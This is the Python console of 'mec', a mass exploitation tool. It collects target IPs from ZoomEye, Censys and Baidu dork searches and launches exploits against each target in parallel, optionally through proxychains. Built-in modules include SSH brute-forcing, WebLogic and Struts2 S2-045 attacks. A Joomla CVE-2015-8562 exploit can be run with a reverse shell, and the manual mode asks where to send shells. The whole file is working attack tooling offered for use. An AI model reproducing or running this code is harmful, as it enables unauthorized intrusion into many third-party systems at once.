#!/usr/bin/python3
# pylint: disable=too-few-public-methods,too-many-instance-attributes,too-many-statements,too-many-branches,too-many-locals,too-many-nested-blocks,broad-except

'''
mass exploit console
by jm33-ng
'''

import os
import shutil
import subprocess
import sys
import time
from multiprocessing import Process

import psutil
import tqdm

import lib.tools.exploits as exploit_exec
from lib.cli import colors, console, futil, proxy
from lib.tools import baidu, censys, scan, zoomeye

# mec root directory
MECROOT = os.path.join(os.path.expanduser("~"), ".mec")


class SessionParameters():

    '''
    define some global parameters
    '''

    def __init__(self):
        self.init_dir = MECROOT
        self.out_dir = self.init_dir + '/output'
        self.proxy_conf = self.init_dir + \
            '/data/proxy.conf'
        self.use_proxy = True
        self.ip_list = self.init_dir + \
            '/data/ip_list.txt'
        self.proxy_bin = self.init_dir + \
            '/tools/ss-proxy'
        self.ss_config = self.init_dir + \
            '/data/ss.json'
        self.logfile = self.init_dir + \
            '/output/' + \
            time.strftime("%Y_%m_%d_%H_%M_%S.log")


# Needed for scanner session later
SESSION = SessionParameters()


def list_exp():
    '''
    list all executables under the root of your exploit dir
    '''
    def is_executable(path):
        '''
        check if executable
        '''

        return os.path.isfile(path) and os.access(path, os.X_OK)

    pocs = []  # save poc in a list

    for root, _, files in os.walk('exploits'):
        paths = []

        for filename in files:
            path = './' + root + '/' + filename
            paths.append(path)

        for pathname in paths:
            poc = '/'.join(pathname.split('/')[2:])

            if len(pathname.split('/')) > 4:
                continue

            if is_executable(pathname):
                pocs.append(poc)

    return pocs


def execute(cmd):
    '''
    handles user input in console
    '''

    # lol i don't want any errors here
    cmd = str(cmd).lower().strip()

    if cmd == '':
        return

    if cmd == "masscan":
        # check root, as masscan requires root privilege

        if os.geteuid() != 0:
            console.print_error(
                "[-] Please run mec as root in order to run masscan")

            return

        ports = console.input_check(
            "[?] What ports do you want to scan (eg. 80 443)? ").split()

        try:
            scan.masscan(ports)
        except KeyboardInterrupt:
            console.print_warning("[-] masscan exited")
    elif cmd == 'info':
        colors.colored_print(
            '[*] Current directory: {}\
            \n[*] Init directory: {}\
            \n[*] Log file: {}\
            \n[*] Target: {}\
            \n[*] Proxy config: {}'.format(
                os.getcwd(),
                SESSION.init_dir,
                SESSION.logfile,
                SESSION.ip_list,
                SESSION.proxy_conf),
            colors.CYAN)

    elif cmd.startswith('target'):
        target = ''.join(cmd.split()[1:])

        if target not in os.listdir(SESSION.init_dir + '/data'):
            console.print_error("[-] Target file not found")

            return
        colors.colored_print(
            '[i] Target changed to {}'.format(target), colors.BLUE)
        SESSION.ip_list = SESSION.init_dir + \
            '/data/' + target

    elif cmd in ('init', 'i'):
        colors.colored_print('[*] Going back to init_dir...', colors.BLUE)
        os.chdir(SESSION.init_dir)

    elif cmd.startswith('baidu'):
        try:
            command = cmd.strip().split()
            dork = command[1]
            count = int(command[2])
            os.chdir(SESSION.out_dir)
            colors.colored_print('[*] Searching on Baidu...', colors.PURPLE)
            baidu.spider(dork, count)

            if console.yes_no("Use collected URL's as target?"):
                SESSION.ip_list = SESSION.init_dir + "result.txt"

        except (IndexError, EOFError, KeyboardInterrupt, SystemExit):
            return

    elif cmd == 'proxy':
        if not os.path.exists(SESSION.ss_config):
            console.print_error(
                '[-] Please make sure {} exists'.format(SESSION.ss_config))

        shadowsocks = proxy.ShadowsocksProxy(
            SESSION.proxy_bin, SESSION.ss_config)
        shadowsocks.start_ss_proxy()

    elif cmd == 'redis':
        console.print_error('[-] Under development')

    elif cmd.startswith('google'):
        try:
            cmd = cmd.strip().split()
            dork = cmd[1]
            # well yes im a lazy guy
            subprocess.call(['./exploits/joomla/joomlaCVE-2015-8562.py',
                             '--dork', dork,
                             '--revshell=\'127.0.0.1\'',
                             '--port=4444'])
        except BaseException as err:
            console.print_error(str(err))
            console.debug_except()

    elif cmd in ('q', 'quit'):
        futil.check_kill_process('ss-proxy')
        sys.exit(0)

    elif cmd in ('h', 'help', '?'):
        print(console.HELP_INFO)

    elif cmd == 'exploits':
        colors.colored_print('[+] Available exploits: ', colors.CYAN)

        for poc in list_exp():
            colors.colored_print(poc, colors.BLUE)

    elif cmd in ('z', "zoomeye"):
        try:
            console.print_warning(
                "[*] ZoomEye now asks for phone verification (+86 only)")
            zoomeye.run()
        except (EOFError, KeyboardInterrupt, SystemExit):
            pass
        except BaseException:
            console.debug_except()
    elif cmd == "censys":
        try:
            output = censys.start()

            if console.yes_no("Use collected URL's as target?"):
                SESSION.ip_list = SESSION.init_dir + "/" + output
                colors.colored_print(
                    '[i] Target changed to {}'.format(
                        SESSION.ip_list), colors.BLUE)

        except BaseException:
            return
    elif cmd in ('x', 'reset'):
        os.system("reset")

    elif cmd in ('c', 'clear'):
        os.system("clear")

    elif cmd in ("attack", "e"):
        attack()

    else:
        try:
            print(
                colors.BLUE +
                colors.BOLD +
                "[*] Exec: " +
                colors.END,
                colors.GREEN +
                cmd, colors.END)
            os.system(cmd)
        except (EOFError, KeyboardInterrupt, SystemExit):
            return


def attack():
    '''
    handles attack command
    '''
    SESSION.use_proxy = console.input_check(
        '[?] Do you wish to use proxychains? [y/n] ',
        choices=['y', 'n']) == 'y'

    if SESSION.use_proxy:
        if shutil.which("proxychains4") is None:
            console.print_error("proxychains4 not found")

            return
        execute("proxy")
    answ = console.input_check(
        '\n[?] Do you wish to use\
        \n\n    [a] built-in exploits\
        \n    [m] or launch your own manually?\
        \n\n[=] Your choice: ',
        choices=['a', 'm'])

    if answ == 'a':
        print(
            colors.CYAN +
            colors.BOLD +
            '\n[?] Choose a module from: ' +
            colors.END +
            '\n')
        print(console.BUILT_IN)
        answ = console.input_check(
            '[=] Your choice: ',
            check_type=int,
            choices=['0',
                     '1',
                     '2',
                     '3',
                     '4'])

        try:
            if answ == '0':
                scanner(exploit_exec.ssh_bruteforcer())
            elif answ == '1':
                scanner(exploit_exec.weblogic())
            elif answ == '2':
                console.print_error("[-] Not available")
            elif answ == '3':
                console.print_error("[-] Not available")
            elif answ == '4':
                scanner(exploit_exec.s2_045())

        except (EOFError, KeyboardInterrupt, SystemExit):
            return

    elif answ == 'm':
        print(
            colors.CYAN +
            colors.UNDERLINE +
            colors.BOLD +
            "\nWelcome, in here you can choose your own exploit\n" +
            colors.END)
        colors.colored_print('[*] Here are available exploits:\n', colors.CYAN)

        for poc in list_exp():
            colors.colored_print(poc + colors.END, colors.BLUE)

        exploit = console.input_check(
            "\n[*] Enter the path (eg. joomla/rce.py) of your exploit: ",
            choices=list_exp())

        jobs = int(
            console.input_check("[?] How many processes each time? ", check_type=int))

        custom_args = []
        answ = console.input_check(
            "[?] Do you need a reverse shell [y/n]? ", choices=['y', 'n'])

        if answ == 'y':
            lhost = console.input_check(
                "[*] Where do you want me to send shells? ", allow_blank=False, ip_check=True)
            lport = console.input_check(
                "[*] and at what port?",
                check_type=int)
            custom_args = ['-l', lhost, '-p', lport]
        else:
            pass

        custom_args += console.input_check(
            "[*] args for this exploit: ").strip().split()

        # parse user's exploit name
        exec_path = exploit.split('/')[1:]
        work_path = exploit.split('/')[:-1]
        exec_path = '/'.join(exec_path)
        work_path = '/'.join(work_path)

        # let user check if there's anything wrong
        print(
            colors.BLUE +
            '[*] Your exploit will be executed like\n' +
            colors.END,
            'proxychains4 -q -f proxy.conf {} -t <target ip>'.format(
                exec_path),
            ' '.join(custom_args))

        # args as parameter for scanner
        scanner_args = console.ScannerArgs(work_path, exec_path,
                                           custom_args,
                                           jobs)
        # start scanner
        scanner(scanner_args)

    else:
        console.print_error('[-] Invalid input')


def scanner(scanner_args):
    '''
    Execute exploit against given ip list
    '''

    # looks ugly, but since it works well, im not planning a rewrite
    try:
        work_path, exec_path = scanner_args.work_path, scanner_args.exec_path
        custom_args, jobs = scanner_args.custom_args, scanner_args.jobs
    except BaseException:
        return

    if SESSION.use_proxy:
        e_args = [
            'proxychains4',
            '-q',
            '-f',
            SESSION.proxy_conf,
            './' + exec_path]
    else:
        e_args = ['./' + exec_path]

    # add custom arguments for different exploits
    e_args += custom_args
    # the last argument is target host
    e_args += ['-t']

    try:
        target_list = open(SESSION.ip_list)
    except BaseException as exc:
        console.print_error('[-] Error occured: {}\n'.format(exc))
        console.debug_except()

        return

    try:
        os.chdir('./exploits/' + work_path)
    except FileNotFoundError:
        console.print_error("[-] Can't chdir to " + work_path)
        console.debug_except()
    console.print_warning(
        '\n[!] DEBUG: ' + str(e_args) + '\nWorking in ' + os.getcwd())

    # you might want to cancel the scan to correct some errors

    if console.input_check('[?] Proceed? [y/n] ', choices=['y', 'n']) == 'n':
        return

    # save stdout to logfile
    try:
        logfile = open(SESSION.logfile, "a+")
    except FileNotFoundError:
        console.print_error("[-] Log file not found")

    # needed for the loop
    procs = []
    pids = []  # collects all pids, check if empty when finishing
    count = len(procs)

    # display help for viewing logs
    print(colors.CYAN +
          "[*] Use `tail -f {}` to view logs\n\n".format(SESSION.logfile))

    # use progress bar
    with open(SESSION.ip_list) as iplistf:
        total = len([0 for _ in iplistf])
        iplistf.close()
    pbar = tqdm.tqdm(total=total, ncols=80, desc="[*] Processing targets")

    for line in target_list:
        target_ip = line.strip()

        # mark this loop as done
        count = len(procs)

        try:
            # start and display current process
            e_args += [target_ip]

            proc = subprocess.Popen(e_args, stdout=logfile, stderr=logfile)
            procs.append(proc)
            pids.append(proc.pid)
            pbar.set_description(desc="[*] Processing {}".format(target_ip))

            # continue to next target
            e_args.remove(target_ip)

            # process pool

            if count == jobs:
                for item in procs:
                    if psutil.pid_exists(item.pid):
                        timer_proc = Process(
                            target=futil.proc_timer, args=(item, ))
                        timer_proc.start()
                    else:
                        pids.remove(item.pid)

                procs = []

        except (EOFError, KeyboardInterrupt, SystemExit):
            # killall running processes
            futil.check_kill_process(exec_path)

            logfile.close()
            pbar.close()
            console.print_error("[-] Task aborted")
            os.chdir(SESSION.init_dir)

            return

        except BaseException as exc:
            console.print_error("[-] Exception: {}\n".format(str(exc)))
            logfile.write("[-] Exception: " + str(exc) + "\n")

        finally:
            # check if any pids are done
            try:
                for pid in pids:
                    if not psutil.pid_exists(pid):
                        pids.remove(pid)
                        pbar.update(1)
            except BaseException:
                pass

    # make sure all processes are done

    if pids:
        time.sleep(10)

    # kill everything, close logfile, exit progress bar, and print done flag
    futil.check_kill_process(exec_path)
    logfile.close()
    pbar.close()
    os.chdir(SESSION.init_dir)
    console.print_success('\n[+] All done!\n')


def main():
    '''
    handles user interface
    '''

    answ = str(
        input(
            colors.CYAN +
            '[?] Use ip_list.txt as target list? [y/n] ' +
            colors.END)).strip()

    if answ.lower() == 'n':
        os.system("ls ~/.mec/data")
        SESSION.ip_list = SESSION.init_dir + '/data/' + \
            console.input_check(
                '[=] Choose your target IP list, eg. ip_list.txt ',
                choices=os.listdir(MECROOT + '/data'))

    while True:
        try:
            cmd = input(
                colors.CYAN +
                colors.BOLD +
                "\nmec > " +
                colors.END)

            try:
                execute(cmd)
            except (KeyboardInterrupt, EOFError, SystemExit):
                sys.exit(0)

        except KeyboardInterrupt:

            try:
                answ = input("\n[?] Are you sure to exit? [y/n] ")
            except KeyboardInterrupt:
                print("\n[-] Okay okay, exiting immediately...")
                futil.check_kill_process('ss-proxy')
                sys.exit(0)

            if answ.lower() == 'y':
                futil.check_kill_process('ss-proxy')
                sys.exit(0)
            else:
                continue


def run():
    '''
    start mec
    '''
    try:
        os.system('clear')
        print(console.INTRO)
        os.chdir(MECROOT)
        main()
    except (EOFError, KeyboardInterrupt, SystemExit):
        console.print_error('[-] Exiting...')
    except FileNotFoundError:
        console.debug_except()
        console.print_error("[-] Please run install.py first")
        sys.exit(1)
    except BaseException:
        console.print_error(
            "[-] Seems like you\'ve encountered an unhandled exception")
        console.debug_except()
